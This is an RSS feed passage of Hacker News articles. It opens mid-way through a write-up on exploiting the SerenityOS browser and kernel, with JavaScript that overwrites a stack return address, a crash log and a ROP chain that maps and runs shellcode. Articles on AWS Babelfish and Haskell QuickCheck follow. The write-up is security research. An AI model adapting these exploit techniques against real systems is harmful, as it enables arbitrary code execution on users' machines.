  <span>log</span><span>(</span><span>"</span><span>libjs_addr 0x</span><span>"</span> <span>+</span> <span>libjs_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
  <span>log</span><span>(</span><span>"</span><span>stack_addr 0x</span><span>"</span> <span>+</span> <span>stack_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

  <span>log</span><span>(</span><span>"</span><span>looking for stack return</span><span>"</span><span>);</span>
  <span>let</span> <span>stack_ret</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>stack_addr</span> <span>+</span> <span>0x400000</span> <span>-</span> <span>4</span><span>;</span> <span>i</span> <span>&gt;</span> <span>stack_addr</span><span>;</span> <span>i</span> <span>-=</span> <span>4</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>read</span><span>(</span><span>i</span><span>)</span> <span>==</span> <span>libjs_addr</span> <span>+</span> <span>0x5af5e</span><span>)</span> <span>{</span>
      <span>log</span><span>(</span><span>"</span><span>found stack_ret 0x</span><span>"</span> <span>+</span> <span>i</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span> <span>+</span> <span>"</span><span>: 0x</span><span>"</span> <span>+</span> <span>read</span><span>(</span><span>i</span><span>).</span><span>toString</span><span>());</span>
      <span>stack_ret</span> <span>=</span> <span>i</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
  <span>}</span>
  <span>write</span><span>(</span><span>stack_ret</span><span>,</span> <span>0x12345678</span><span>);</span>
<span>&lt;/script&gt;</span>
</code></pre></div></div>

<p>Loading the above in the browser resulting in a crash at <code>0x12345678</code>:</p>

<div><div><pre><code>[Browser(37:37)]: CPU[0] NP(error) fault at invalid address V0x12345678
[Browser(37:37)]: Unrecoverable page fault, instruction fetch / read from address V0x12345678
[Browser(37:37)]: CRASH: CPU #0 Page Fault. Ring 3.
[Browser(37:37)]: exception code: 0014 (isr: 0000
[Browser(37:37)]:   pc=001b:12345678 flags=0246
[Browser(37:37)]:  stk=0023:026ff2e4
[Browser(37:37)]:   ds=0023 es=0023 fs=0023 gs=002b
[Browser(37:37)]: eax=026ff3c0 ebx=0491ce8c ecx=00000000 edx=0491e4a0
[Browser(37:37)]: ebp=026ff378 esp=c2a48fe8 esi=00000005 edi=02d0dfd8
[Browser(37:37)]: cr0=80010013 cr2=12345678 cr3=07351000 cr4=003006e4
[Browser(37:37)]: CPU[0] NP(error) fault at invalid address V0x12345678
[Browser(37:37)]: 0x12345678  (?)
</code></pre></div></div>

<p>Since we can write any amount to the stack, it was fairly straight forward to build a rop chain that mmapped a region, put some shellcode there, mprotected it to make it executable, then jump there:</p>

<div><div><pre><code><span>const</span> <span>libc_addr</span> <span>=</span> <span>libjs_addr</span> <span>-</span> <span>0x122000</span><span>;</span>
<span>const</span> <span>mmap_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x1b379</span><span>;</span>
<span>const</span> <span>memcpy_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x002f51d</span><span>;</span>
<span>const</span> <span>mprotect_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x1b487</span><span>;</span>

<span>const</span> <span>shellcode</span> <span>=</span> <span>[</span><span>0xcccccccc</span><span>];</span>

<span>// write our shellcode to a know location (start of the stack)</span>
<span>const</span> <span>shellcode_addr</span> <span>=</span> <span>stack_addr</span><span>;</span>
<span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>shellcode</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
  <span>write</span><span>(</span><span>shellcode_addr</span> <span>+</span> <span>i</span> <span>*</span> <span>4</span><span>,</span> <span>shellcode</span><span>[</span><span>i</span><span>]);</span>
<span>}</span>

<span>log</span><span>(</span><span>"</span><span>shellcode_addr: 0x</span><span>"</span> <span>+</span> <span>shellcode_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

<span>// rop gadgets</span>
<span>// 0x000462f3: pop esi; pop edi; pop ebp; ret;</span>
<span>// 0x0007bda9: add esp, 0x10; pop esi; pop edi; pop ebp; ret;</span>

<span>pop7_addr</span> <span>=</span> <span>libjs_addr</span> <span>+</span> <span>0x0007bda9</span><span>;</span>
<span>pop3_adr</span> <span>=</span> <span>libjs_addr</span> <span>+</span> <span>0x000462f3</span><span>;</span>

<span>log</span><span>(</span><span>"</span><span>pop7_addr: 0x</span><span>"</span> <span>+</span> <span>pop7_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
<span>log</span><span>(</span><span>"</span><span>pop3_adr: 0x</span><span>"</span> <span>+</span> <span>pop3_adr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

<span>// 1. map region at 0x9d000000</span>
<span>// 2. memcpy our shellcode there</span>
<span>// 3. make it executable</span>
<span>// 4. jump there</span>
<span>write</span><span>(</span><span>stack_ret</span><span>,</span> <span>mmap_addr</span><span>);</span>
<span>const</span> <span>rop</span> <span>=</span> <span>[</span>
  <span>pop7_addr</span><span>,</span> <span>//ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>0x8000</span><span>,</span>
  <span>3</span><span>,</span>
  <span>0x32</span><span>,</span>
  <span>0</span><span>,</span>
  <span>0</span><span>,</span>
  <span>0xdeadbeef</span><span>,</span>

  <span>memcpy_addr</span><span>,</span>
  <span>pop3_adr</span><span>,</span> <span>// ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>shellcode_addr</span><span>,</span>
  <span>0x8000</span><span>,</span>

  <span>mprotect_addr</span><span>,</span>
  <span>pop3_adr</span><span>,</span> <span>// ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>0x8000</span><span>,</span>
  <span>5</span><span>,</span>

  <span>0x9d000000</span><span>,</span>
<span>];</span>
<span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>rop</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
  <span>write</span><span>(</span><span>stack_ret</span> <span>+</span> <span>4</span> <span>*</span> <span>(</span><span>2</span> <span>+</span> <span>i</span><span>),</span> <span>rop</span><span>[</span><span>i</span><span>]);</span>
<span>}</span>

<span>// finish to trigger the rop chain</span>
</code></pre></div></div>

<p>After loading this up and setting a breakpoint with gdb at <code>0x9d000000</code>:</p>

<p><img src="https://devcraft.io/assets/serenity/gef.jpg" alt="gef"></p>

<p>Success! Arbitrary code in the browser.</p>

<h3 id="kernel-bug-hunting">Kernel Bug Hunting</h3>

<p>Next it was time to try and find a kernel bug that could be reached from the browser process. There had been a few issues with integer overflows, so I started looking for places that this might happen. After some searching I saw the following in <a href="https://github.com/SerenityOS/serenity/blob/22b0ff05d4a5b087d805d8147ca12efe410cb18f/Kernel/VM/RangeAllocator.cpp#L139">RangeAllocator::allocate_anywhere</a>:</p>

<div><div><pre><code><span>for</span> <span>(</span><span>size_t</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>m_available_ranges</span><span>.</span><span>size</span><span>();</span> <span>++</span><span>i</span><span>)</span> <span>{</span>
    <span>auto</span><span>&amp;</span> <span>available_range</span> <span>=</span> <span>m_available_ranges</span><span>[</span><span>i</span><span>];</span>

    <span>// FIXME: This check is probably excluding some valid candidates when using a large alignment.</span>
    <span>if</span> <span>(</span><span>available_range</span><span>.</span><span>size</span><span>()</span> <span>&lt;</span> <span>(</span><span>effective_size</span> <span>+</span> <span>alignment</span><span>))</span>
        <span>continue</span><span>;</span>
</code></pre></div></div>

<p>Each process has a list of available ranges that are used when allocating memory regions. This code is looping through all the ranges and seeing if there is one large enough to hold the requested size, taking into account the alignment (both <code>effective_size</code> and <code>alignment</code> are controlled by the user). The issue is that <code>effective_size + alignment</code> can overflow, resulting in a range being chosen that is too small to hold the requested size.</p>

<p>The <code>available_range</code> is then used to create a new allocated range:</p>

<div><div><pre><code>    <span>FlatPtr</span> <span>initial_base</span> <span>=</span> <span>available_range</span><span>.</span><span>base</span><span>().</span><span>offset</span><span>(</span><span>offset_from_effective_base</span><span>).</span><span>get</span><span>();</span>
    <span>FlatPtr</span> <span>aligned_base</span> <span>=</span> <span>round_up_to_power_of_two</span><span>(</span><span>initial_base</span><span>,</span> <span>alignment</span><span>);</span>

    <span>Range</span> <span>allocated_range</span><span>(</span><span>VirtualAddress</span><span>(</span><span>aligned_base</span><span>),</span> <span>size</span><span>);</span>
    <span>if</span> <span>(</span><span>available_range</span> <span>==</span> <span>allocated_range</span><span>)</span> <span>{</span>
        <span>dbgln</span><span>&lt;</span><span>VRA_DEBUG</span><span>&gt;</span><span>(</span><span>"VRA: Allocated perfect-fit anywhere({}, {}): {}"</span><span>,</span> <span>size</span><span>,</span> <span>alignment</span><span>,</span> <span>allocated_range</span><span>.</span><span>base</span><span>().</span><span>get</span><span>());</span>
        <span>m_available_ranges</span><span>.</span><span>remove</span><span>(</span><span>i</span><span>);</span>
        <span>return</span> <span>allocated_range</span><span>;</span>
    <span>}</span>
    <span>carve_at_index</span><span>(</span><span>i</span><span>,</span> <span>allocated_range</span><span>);</span>

    <span>return</span> <span>allocated_range</span><span>;</span>
</code></pre></div></div>

<p>If it isn‚Äôt exactly equal then it carves out the range and add the remaining range back into <code>m_available_ranges</code>:</p>

<div><div><pre><code><span>void</span> <span>RangeAllocator</span><span>::</span><span>carve_at_index</span><span>(</span><span>int</span> <span>index</span><span>,</span> <span>const</span> <span>Range</span><span>&amp;</span> <span>range</span><span>)</span>
<span>{</span>
    <span>ASSERT</span><span>(</span><span>m_lock</span><span>.</span><span>is_locked</span><span>());</span>
    <span>auto</span> <span>remaining_parts</span> <span>=</span> <span>m_available_ranges</span><span>[</span><span>index</span><span>].</span><span>carve</span><span>(</span><span>range</span><span>);</span>
    <span>ASSERT</span><span>(</span><span>remaining_parts</span><span>.</span><span>size</span><span>()</span> <span>&gt;=</span> <span>1</span><span>);</span>
    <span>m_available_ranges</span><span>[</span><span>index</span><span>]</span> <span>=</span> <span>remaining_parts</span><span>[</span><span>0</span><span>];</span>
    <span>if</span> <span>(</span><span>remaining_parts</span><span>.</span><span>size</span><span>()</span> <span>==</span> <span>2</span><span>)</span>
        <span>m_available_ranges</span><span>.</span><span>insert</span><span>(</span><span>index</span> <span>+</span> <span>1</span><span>,</span> <span>move</span><span>(</span><span>remaining_parts</span><span>[</span><span>1</span><span>]));</span>
<span>}</span>

<span>Vector</span><span>&lt;</span><span>Range</span><span>,</span> <span>2</span><span>&gt;</span> <span>Range</span><span>::</span><span>carve</span><span>(</span><span>const</span> <span>Range</span><span>&amp;</span> <span>taken</span><span>)</span>
<span>{</span>
    <span>Vector</span><span>&lt;</span><span>Range</span><span>,</span> <span>2</span><span>&gt;</span> <span>parts</span><span>;</span>
    <span>if</span> <span>(</span><span>taken</span> <span>==</span> <span>*</span><span>this</span><span>)</span>
        <span>return</span> <span>{};</span>
    <span>if</span> <span>(</span><span>taken</span><span>.</span><span>base</span><span>()</span> <span>&gt;</span> <span>base</span><span>())</span>
        <span>parts</span><span>.</span><span>append</span><span>({</span> <span>base</span><span>(),</span> <span>taken</span><span>.</span><span>base</span>‚Ä¶</code></pre></div></div></div></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html</a></em></p>]]>
            </description>
            <link>https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26115141</guid>
            <pubDate>Fri, 12 Feb 2021 16:09:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SVG: The Good, the Bad and the Ugly]]>
            </title>
            <description>
<![CDATA[
Score 214 | Comments 207 (<a href="https://news.ycombinator.com/item?id=26114863">thread link</a>) | @davebloggt
<br/>
February 12, 2021 | https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html | <a href="https://web.archive.org/web/*/https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114863</guid>
            <pubDate>Fri, 12 Feb 2021 15:43:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Babelfish: The Elephant in the PostgreSQL Room?]]>
            </title>
            <description>
<![CDATA[
Score 192 | Comments 158 (<a href="https://news.ycombinator.com/item?id=26114281">thread link</a>) | @ahachete
<br/>
February 12, 2021 | https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/ | <a href="https://web.archive.org/web/*/https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        <div>
            <div>
                
                <div>
                    <p>On December 1st, 2020, <a href="https://aws.amazon.com/blogs/opensource/want-more-postgresql-you-just-might-like-babelfish/">Amazon AWS announced Babelfish</a>. Babelfish ‚Äú<em>adds an endpoint to PostgreSQL that understands the SQL Server wire protocol Tabular Data Stream (TDS), as well as commonly used T-SQL commands used by SQL Server. Support for T-SQL includes elements such as the SQL dialect, cursors, catalog views, data types, triggers, stored procedures, and functions</em>‚Äù. Wow. <strong>SQL Server wire and application compatibility for PostgreSQL!</strong></p>
<p>What this means is that Babelfish will be able to ‚Äúimpersonate‚Äù a SQL Server database. Applications may be able to run unchanged, believing that they are connecting to SQL Server, when they will actually be connecting to PostgreSQL-Babelfish.</p>
<p>Surely, compatibility will not be 100% at the beginning. But it will keep improving, and <strong>as long as it provides enough compatibility for a nice set of applications to run unchanged on Babelfish, it will open the door to migrations and replacing SQL Servers with Babelfish</strong>. This is very good news for the PostgreSQL Community!</p>
<h2 id="brief-analysis-on-postgresql-popularity">Brief analysis on PostgreSQL popularity</h2>
<p><a href="https://db-engines.com/en/blog_post/85">PostgreSQL has been named (again) database of the year 2020</a>. This award is given based on ‚Äú<em>DBMSs sorted by how much they managed to increase their popularity in 2020</em>‚Äù, which means that <strong>PostgreSQL was the database that grew the most in popularity in 2020</strong>. <strong>But in absolute terms, PostgreSQL‚Äôs popularity is still way behind that of Oracle, MySQL and SQL Server</strong>. Let‚Äôs analyze <a href="https://db-engines.com/en/ranking_trend">db-engines popularity trend chart</a> for the Top4 DBMS, on a linear scale (db-engines presents results on a logarithmic scale):</p>
<p><img src="https://postgresql.fund/img/dbengines_popularity_ranking-linear-900.png" alt="DB-engines popularity ranking - linear scale"></p>
<p>The trends for the last 8 years are clear: Oracle and SQL Server are constantly declining in popularity; MySQL is slightly declining; and PostgreSQL is clearly growing in popularity. But while PostgreSQL almost tripled in popularity in these eight years, it is still far behind the other three.</p>
<p>PostgreSQL became the database of 2020 because its popularity grew the most in the last year. The other three mentioned databases declined in popularity during 2020. If we assume the same rate of change in popularity will continue for the upcoming years, by 2025 PostgreSQL would still remain in the 4th place, albeit close to SQL Server. It won‚Äôt overtake SQL Server until 2026, and by 2030 PostgreSQL would still lag behind Oracle and MySQL.</p>
<table>
<thead>
<tr>
<th></th>
<th>Jan 21</th>
<th>+/- Jan 20</th>
<th>Est. 2025</th>
<th>Est. 2030</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>Oracle</em></td>
<td>1,317</td>
<td>-28</td>
<td>1,204</td>
<td>1,064</td>
</tr>
<tr>
<td><em>MySQL</em></td>
<td>1,243</td>
<td>-24</td>
<td>1,146</td>
<td>1,025</td>
</tr>
<tr>
<td><em>Microsoft SQL Server</em></td>
<td>1,023</td>
<td>-71</td>
<td>740</td>
<td>386</td>
</tr>
<tr>
<td><em>PostgreSQL</em></td>
<td>551</td>
<td>44</td>
<td>727</td>
<td>947</td>
</tr>
</tbody>
</table>
<p>How is this analysis related to Babelfish? <strong>Babelfish opens the door to new users, new markets, new opportunities. <strong>Babelfish may bump PostgreSQL‚Äôs popularity further, targeting use cases that either PostgreSQL is not able to reach today; or can only reach via complex technology migrations.</strong> Babelfish could be one of the many potential boosts that PostgreSQL needs in order to become a more universally used database</strong>.</p>
<h2 id="to-fork-or-not-to-fork-thats-the-question">To fork, or not to fork, that‚Äôs the question</h2>
<p>In their announcement, AWS said that ‚Äú<em>We are open sourcing Babelfish in 2021. [‚Ä¶] We are releasing Babelfish under the Apache 2.0 license. We invite others to become active in the project, and we will see it as a sign of success when developers outside of AWS become committers or maintainers. You can help by adding or extending Babelfish functionality, submitting feature requests, working on documentation, and contributing test cases</em>‚Äù. They also mentioned the code will be published on GitHub.</p>
<p><strong>At the time Babelfish will be published, it will likely require changes to PostgreSQL to enable Babelfish to be an extension</strong>. Some people may call that a ‚Äúfork‚Äù of PostgreSQL, and others may call it a ‚Äúdevelopment branch‚Äù. The difference between the two will only be clear over time. Note that PostgreSQL development model doesn‚Äôt use feature branches, and in my opinion it‚Äôs a great model ‚Äìbut this is an entirely different topic. It is really appreciated that AWS is releasing the code as open source, and under a permissive license (that should be compatible with PostgreSQL‚Äôs). <strong>If AWS developers work with the PostgreSQL Community to get the necessary changes merged into PostgreSQL core, then it would have been a development branch, and not a fork. This is something that the PostgreSQL Community and all parties involved need to figure out</strong>.</p>
<p>On January 25th, Amazon AWS made a first move. In an <a href="https://www.postgresql.org/message-id/CAGBW59d5SjLyJLt-jwNv%2BoP6esbD8SCB%3D%3D%3D11WVe5%3DdOHLQ5wQ%40mail.gmail.com">email to PostgreSQL‚Äôs hackers mailing list</a>, Jan Wieck, a well-known Postgres-er, proposed to start discussing the implementation of protocol hooks. These hooks would enable to implement SQL Server‚Äôs protocol as an extension, rather than a fork.</p>
<p>Protocol hooks are, possibly, not the only hooks or modifications to PostgreSQL core that would be required to integrate the whole Babelfish project. With those changes to the core most of the Babelfish code could possibly be integrated in core as an extension(s). I cannot estimate the complexity of these core changes. But I believe that it would be a worthwhile effort, an effort that may further increase PostgreSQL outreach.</p>
<p>Only very recently (Feb 10th, 11th) some initial, very interesting, discussion around this proposal has started (including a very interesting offer to <a href="https://www.postgresql.org/message-id/CADUqk8UndFi7WHVNZscs4ZCk37_2aBUw-K32QA7sQd_3cJ%2Bqng%40mail.gmail.com">open source MySQL protocol compatibility for Postgres!</a>). It‚Äôs understandable, it‚Äôs a very busy time for PostgreSQL hackers (the last Commitfest for feature inclusion into PostgreSQL 14 is ongoing). But Babelfish was already announced more than two months ago; and it could be published anytime. I believe we need to start a deeper conversation about Postgres-Babelfish integration sooner than later. And what is being discussed so far are mainly technical considerations around the integration of one of the possibly several integration points that may be required. <strong>I‚Äôd love to also have a strategic discussion, where the Community would address, from a leadership perspective, what would be the plans for integrating, or not, Babelfish</strong>. <strong>Is Babelfish the Elephant in the Room?</strong> Probably not anymore, but I anyway hope this post will help, at the very least, to spark the strategic discussion.</p>
<p>What is the alternative? What will happen if PostgreSQL would not implement such hooks or will not pursue understanding with AWS, for the common benefit, and help Babelfish and PostgreSQL cooperate and allow for code bases integration?</p>
<p><strong>Under this scenario, AWS will probably have to keep Babelfish as a fork</strong>. For one, AWS already keeps Aurora as a fork, even though it‚Äôs an internal one. Given AWS‚Äô well-known customer obsession and that AWS doesn‚Äôt kill services that they started offering, I think that if given no other chance they will keep Babelfish as a separate fork, getting its own share of features and contributors. Surely AWS knows that maintaining a fork is expensive. And I believe they have no intention to have it as a fork (otherwise, they won‚Äôt be publishing it as open source). So there will be serious intentions and efforts to merge it into PostgreSQL, for the benefit of all. But the recent Elastic case has demonstrated that AWS is committed to the open source software that is part of their managed services, and are willing to step up with a lot of resources when they are required to continue serving their customers. Apparently AWS has around 200 open job positions (!!) for developers working on Elasticsearch. Surely they can do the same for Babelfish, especially given that RDS Postgres/Aurora/Babelfish is probably a much larger business for them than Elastic.</p>
<h2 id="on-protocol-hooks">On protocol hooks</h2>
<p>Jan also argued that ‚Äú<em>Creating the necessary infrastructure in the postmaster and backend will open up more possibilities, that are not tied to our compatibility efforts. Possible use cases for wire protocol extensibility include the development of a completely new, not backwards compatible PostgreSQL protocol or extending the existing wire protocol</em>‚Äù. I cannot agree more. This effort not only benefits the Babelfish integration; but also opens the door for new PostgreSQL protocols.</p>
<p>The current PostgreSQL protocol (v3) <a href="https://www.postgresql.org/docs/7.4/release-7-4.html">has been in use since PostgreSQL 7.4</a>, released in 2003. It works well, and has spun the broadest possible set of drivers, tools and even compatible databases that use it (like CockroachDB, Crate.io or NoisePage, for example). But it also has some limitations and well-known problems. There is an entry in PostgreSQL ‚ÄúTODO‚Äù about <a href="https://wiki.postgresql.org/wiki/Todo#Wire_Protocol_Changes_.2F_v4_Protocol">proposed changes for an eventual v4 version of the protocol</a>. I also participated in another <a href="https://github.com/pgjdbc/pgjdbc/blob/95ba7b261e39754674c5817695ae5ebf9a341fae/backend_protocol_v4_wanted_features.md">‚Äúbrain dump‚Äù on v4 proposed features</a>. But despite much talk, v4 has not happened and there‚Äôs no ongoing effort to make it happen. v3 is to stay for long.</p>
<p>Why is that, why can‚Äôt the protocol evolve? Have a look at <a href="https://www.postgresql.org/message-id/CD5C1525-8B2C-4986-87F0-B1CB3B52ACA7%40wa-research.ch">this thread</a>, where a proposal to implement an HTTP protocol for PostgreSQL was made. Other than the proposal about HTTP itself ‚Äìwhich has its own merits, and is a topic that I believe should definitely be discussed again‚Äì, the general sentiment was that <strong>any new protocol would have to provide all the features that the current protocol has, work for every use case, do not disrupt existing drivers or provide good means for driver rewrites; and do it significantly better than the current one</strong>.</p>
<h2 id="the-innovators-dilemma">The Innovator‚Äôs Dilemma</h2>
<p>I don‚Äôt have an MBA, but this to me is a clear case of <a href="https://en.wikipedia.org/wiki/The_Innovator%27s_Dilemma">The Innovator‚Äôs Dilemma</a>. PostgreSQL protocol v3 is the incumbent, and protocol v4 and/or other protocols like HTTP are the potential disruptive innovators. In what looks like a perfect match for Christensen‚Äôs book, a disruptive protocol innovation ‚Äú<em>would not initially satisfy the demands of even the high end of the market</em>‚Äù. In other words, initial versions of these protocols should not target feature parity with the incumbent. They should rather focus on doing the basics, but much better, with a compelling higher value proposition.</p>
<p>Eventually, these protocols ‚Äú<em>will surpass sustaining technologies</em>‚Äù and may end up replacing the current v3 protocol. This was very well explained by Prof. Clayton and is represented on his famous graph comparing the product ‚Ä¶</p></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/">https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/</a></em></p>]]>
            </description>
            <link>https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114281</guid>
            <pubDate>Fri, 12 Feb 2021 14:58:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fuzz me wrong ‚Äì How QuickCheck destroyed my favourite theory]]>
            </title>
            <description>
<![CDATA[
Score 124 | Comments 56 (<a href="https://news.ycombinator.com/item?id=26112441">thread link</a>) | @lrngjcb
<br/>
February 12, 2021 | https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html | <a href="https://web.archive.org/web/*/https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    
    <div>
    <p><em>Posted on January 30, 2021
    
        by Thomas Mahler
    </em></p></div>

<h2 id="introduction">Introduction</h2>
<p>Quite a while back I wrote a larger article on the algebraic foundation of software patterns which also covered the <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html#map-reduce">MapReduce algorithm</a>.</p>
<p>During the research digged out a paper on <a href="https://pdfs.semanticscholar.org/0498/3a1c0d6343e21129aaffca2a1b3eec419523.pdf">algebraic properties of distributed big data analytics</a>, which explained that a MapReduce will always work correctly when the intermediate data structure resulting from the <code>map</code>-phase is a Monoid under the <code>reduce</code>-operation.</p>
<p>For some reason, I was not convinced that this Monoid-condition was enough, because all the typical examples like word-frequency maps are even <strong>commutative</strong> Monoids under the respective reduce operation.</p>
<p>So I came up with the following personal theory:</p>
<blockquote>
<p>Only if the intermediate data structure resulting from the <code>map</code>-phase is a <strong>commutative Monoid</strong> under the <code>reduce</code>-operation, then a parallel MapReduce will produce correct results.</p>
</blockquote>
<p>I tried to validate this property using the <a href="https://wiki.haskell.org/Introduction_to_QuickCheck2">QuickCheck test framework</a>.</p>
<p>Interestingly the QuickCheck tests failed! This finally convinced me that my theory was wrong, and after a little deeper thought, I could understand why.</p>
<p>I was impressed with the power of QuickCheck, so I thought it would be a good idea to share this lesson in falsification.</p>
<p>The code shown in this blog <a href="https://github.com/thma/CommutativeMonoid">is also available on GitHub</a></p>
<h2 id="commutative-monoids">Commutative Monoids</h2>
<p>In abstract algebra, a monoid is a <em>set</em> equipped with an <em>associative binary operation</em> and an <em>identity element</em>.</p>
<p>The simplest example for a <em>commutative Monoid</em> is <span>\((\mathbb{N}_0, +, 0)\)</span>: the natural numbers under addition with <span>\(0\)</span> as the identity (or neutral) element. We can use QuickCheck to verify that indeed the Monoid laws plus commutativity are maintained.</p>
<p>If we want to use <code>GHC.Natural</code> type to represent natural numbers, we first have to make <code>Natural</code> instantiate the <code>Arbitrary</code> type class which is used by QuickCheck to automatically generate test data:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>import</span>           <span>Test.QuickCheck</span> (<span>Arbitrary</span>, arbitrary, <span>NonNegative</span> (..))</span>
<span id="cb1-2"><span>import</span>           <span>GHC.Natural</span>     (<span>Natural</span>, naturalFromInteger)</span>
<span id="cb1-3"></span>
<span id="cb1-4"><span>instance</span> <span>Arbitrary</span> <span>Natural</span> <span>where</span></span>
<span id="cb1-5">  arbitrary <span>=</span> <span>do</span></span>
<span id="cb1-6">    <span>NonNegative</span> nonNegative <span>&lt;-</span> arbitrary</span>
<span id="cb1-7">    <span>return</span> <span>$</span> naturalFromInteger nonNegative</span></code></pre></div>
<p>Now we can start to write our property based tests. For algebraic structures it is straightforward to come up with properties: we just write the required laws (associativity, 0 is identity element and commutativity) as properties.</p>
<p>I am using Hspec as a wrapper around QuickCheck as it provides a very nice testing DSL which makes it easy to read the code and the output of the test suite:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>import</span>           <span>Test.Hspec</span></span>
<span id="cb2-2"></span>
<span id="cb2-3"><span>spec ::</span> <span>Spec</span></span>
<span id="cb2-4">spec <span>=</span> <span>do</span></span>
<span id="cb2-5">  describe <span>"The Monoid 'Natural Numbers under Addition'"</span> <span>$</span> <span>do</span></span>
<span id="cb2-6">    it <span>"is associative"</span> <span>$</span></span>
<span id="cb2-7">      property <span>$</span> \x y z <span>-&gt;</span> ((x <span>+</span> y) <span>+</span> z) <span>`shouldBe`</span> ((x <span>+</span> (y <span>+</span> z))<span> ::</span> <span>Natural</span>)</span>
<span id="cb2-8">      </span>
<span id="cb2-9">    it <span>"has 0 as left and right identity element"</span> <span>$</span></span>
<span id="cb2-10">      property <span>$</span> \x <span>-&gt;</span> (x <span>+</span> <span>0</span> <span>`shouldBe`</span> (<span>x ::</span> <span>Natural</span>)) <span>.&amp;&amp;.</span> (<span>0</span> <span>+</span> x <span>`shouldBe`</span> x)</span>
<span id="cb2-11">      </span>
<span id="cb2-12">    it <span>"is commutative"</span> <span>$</span></span>
<span id="cb2-13">      property <span>$</span> \x y <span>-&gt;</span> x <span>+</span> y <span>`shouldBe`</span> (y <span>+</span><span> x ::</span> <span>Natural</span>)</span></code></pre></div>
<p>The output of these tests will be as follows:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>Monoid</span></span>
<span id="cb3-2">  <span>The</span> Monoid <span>'Natural Numbers under Addition'</span></span>
<span id="cb3-3">    <span>is</span> associative</span>
<span id="cb3-4">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb3-5">    <span>has</span> 0 as identity (or neutral) <span>element</span></span>
<span id="cb3-6">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb3-7">    <span>is</span> commutative</span>
<span id="cb3-8">      <span>+++</span> OK, passed 100 tests.</span></code></pre></div>
<p>So behind the scenes, QuickCheck has generated test data for 100 tests for each property under test. For all these data the test cases passed.</p>
<p>This is definitely not a proof. But it gives us some confidence that our math text-books are correct when giving Natural Numbers under addition as an example for a commutative Monoid.</p>
<p>OK, that was easy! Now let‚Äôs move to non-commutative Monoids.</p>
<h2 id="non-commutative-monoids">Non-commutative Monoids</h2>
<p>Strings (or any other Lists) under concatenation are a typical example. It‚Äôs easy to see that <code>"hello" ++ ("dear" ++ "people")</code> equals <code>"(hello" ++ "dear") ++ "people"</code>, but that <code>"hello" ++ "world"</code> differs from <code>"world" ++ "hello"</code>.</p>
<p>Now let‚Äôs try to formalize these intuitions as QuickCheck property based tests again.</p>
<p>First I‚Äôm introducing an alias for <code>(++)</code>, as it is defined on any list type, it would be required to have type signatures in all properties (as we had all those <code>:: Natural</code> signatures in the examples above). So I define an operation <code>(‚äï)</code> which is only defined on <code>String</code> instances:</p>
<div id="cb4"><pre><code><span id="cb4-1">(‚äï)<span> ::</span> <span>String</span> <span>-&gt;</span> <span>String</span> <span>-&gt;</span> <span>String</span></span>
<span id="cb4-2">(‚äï) a b <span>=</span> a <span>++</span> b</span></code></pre></div>
<p>Now we can extend our test suite with the following test cases:</p>
<div id="cb5"><pre><code><span id="cb5-1">  describe <span>"The Monoid 'Strings under concatenation'"</span> <span>$</span> <span>do</span></span>
